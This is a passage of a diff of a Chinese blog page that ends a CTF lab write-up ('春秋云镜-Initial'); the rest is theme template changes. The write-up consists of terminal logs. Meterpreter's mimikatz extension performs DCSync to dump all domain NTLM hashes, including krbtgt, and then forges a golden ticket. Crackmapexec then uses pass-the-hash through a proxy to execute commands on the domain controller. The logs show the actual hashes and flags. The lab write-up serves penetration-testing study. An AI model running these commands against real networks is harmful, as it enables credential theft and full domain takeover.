+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1000    DC01$   34b07f0e507a89afd072a38a87d9ade7        532480</span><br><span class="line">1104    XIAORANG-OA01$  6e044889fa255c3d36a379f86cde1c5f        4096</span><br><span class="line">1108    XIAORANG-WIN7$  1cd853447da375a93c53bf8c03d3068e        4096</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成黄金票据</span></span><br><span class="line">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] <span class="string">&#x27;krbtgt&#x27;</span> will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : 2022/6/5 20:40:39</span><br><span class="line">Object Security ID   : S-1-5-21-314492864-3856862959-4045974917-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: fb812eea13a18b7fcdb8e6d67ddc205b</span><br><span class="line">    ntlm- 0: fb812eea13a18b7fcdb8e6d67ddc205b</span><br><span class="line">    lm  - 0: c4f45322c850c77aecb3aa71c2e44c1e</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 849f7f8ab6eb3b3a1c7c926de5ee5574</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : XIAORANG.LABkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : acbbedcabc9ad1d8638cda298e15761626e1bce7ce80eae90d95252f8162bba8</span><br><span class="line">      aes128_hmac       (4096) : 207ea00513bdf19042937aa38c9ad2dd</span><br><span class="line">      des_cbc_md5       (4096) : c70ee386138c7016</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : XIAORANG.LABkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : c70ee386138c7016</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入黄金票据</span></span><br><span class="line">meterpreter &gt; kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">User      : administrator</span><br><span class="line">Domain    : xiaorang.lab (XIAORANG)</span><br><span class="line">SID       : S-1-5-21-314492864-3856862959-4045974917-502</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: fb812eea13a18b7fcdb8e6d67ddc205b - rc4_hmac_nt      </span><br><span class="line">Lifetime  : 2023/10/22 15:33:33 ; 2033/10/19 15:33:33 ; 2033/10/19 15:33:33</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;administrator @ xiaorang.lab&#x27;</span> successfully submitted <span class="keyword">for</span> current session</span><br><span class="line"></span><br><span class="line"><span class="comment"># wmiexec哈希传递</span></span><br><span class="line"><span class="comment"># msf转shell半天转不过来，换个方式</span></span><br><span class="line"><span class="comment"># msf转shell后的利用方式：wmiexec.exe -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 &quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br><span class="line">⚡ root@kali  ~  proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[*] First time use detected</span><br><span class="line">[*] Creating home directory structure</span><br><span class="line">[*] Creating default workspace</span><br><span class="line">[*] Initializing FTP protocol database</span><br><span class="line">[*] Initializing MSSQL protocol database</span><br><span class="line">[*] Initializing RDP protocol database</span><br><span class="line">[*] Initializing WINRM protocol database</span><br><span class="line">[*] Initializing LDAP protocol database</span><br><span class="line">[*] Initializing SSH protocol database</span><br><span class="line">[*] Initializing SMB protocol database</span><br><span class="line">[*] Copying default configuration file</span><br><span class="line">[*] Generating SSL certificate</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:135  ...  OK</span><br><span class="line">SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)</span><br><span class="line">[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:445  ...  OK</span><br><span class="line">SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)</span><br><span class="line">[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:49668  ...  OK</span><br><span class="line">SMB         172.22.1.2      445    DC01             [+] Executed <span class="built_in">command</span> </span><br><span class="line">SMB         172.22.1.2      445    DC01             ___   ___</span><br><span class="line">SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )</span><br><span class="line">SMB         172.22.1.2      445    DC01             \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //</span><br><span class="line">SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____</span><br><span class="line">SMB         172.22.1.2      445    DC01             / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /</span><br><span class="line">SMB         172.22.1.2      445    DC01             / /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             flag03: e8f88d0d43d6&#125;</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.</span><br></pre></td></tr></table></figure>
 
 <h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
-      
-        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="print-no-link">#春秋云镜</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>春秋云镜-Initial</div>
-      <div>https://cvbxy.github.io/2024/06/20/春秋云镜-Initial/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>cvbxy</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2024年6月20日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
                     
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/06/20/2023%E9%99%87%E5%89%91%E6%9D%AF/" title="2023陇剑杯">
-                        <span class="hidden-mobile">2023陇剑杯</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
                 </div>
-              
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/06/20/2023%E9%99%87%E5%89%91%E6%9D%AF/"
+                                   title="2023陇剑杯"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">2023陇剑杯</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
             </div>
+        </div>
 
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#flag01"><span class="nav-text">flag01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag02"><span class="nav-text">flag02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag03"><span class="nav-text">flag03</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
             
-          </article>
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">cvbxy</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
         </div>
-      </div>
     </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
 </div>
 
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
     </div>
-  </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
 </div>
 
     
 
+    <!-- tablet toc -->
     
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#flag01"><span class="nav-text">flag01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag02"><span class="nav-text">flag02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag03"><span class="nav-text">flag03</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li></ol>
     </div>
-  
-  
-  
-  
 </div>
 
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
+            </div>
+        </div>
+    
+</main>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
 
 
-  
+<!-- local search -->
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
 </body>
 </html>
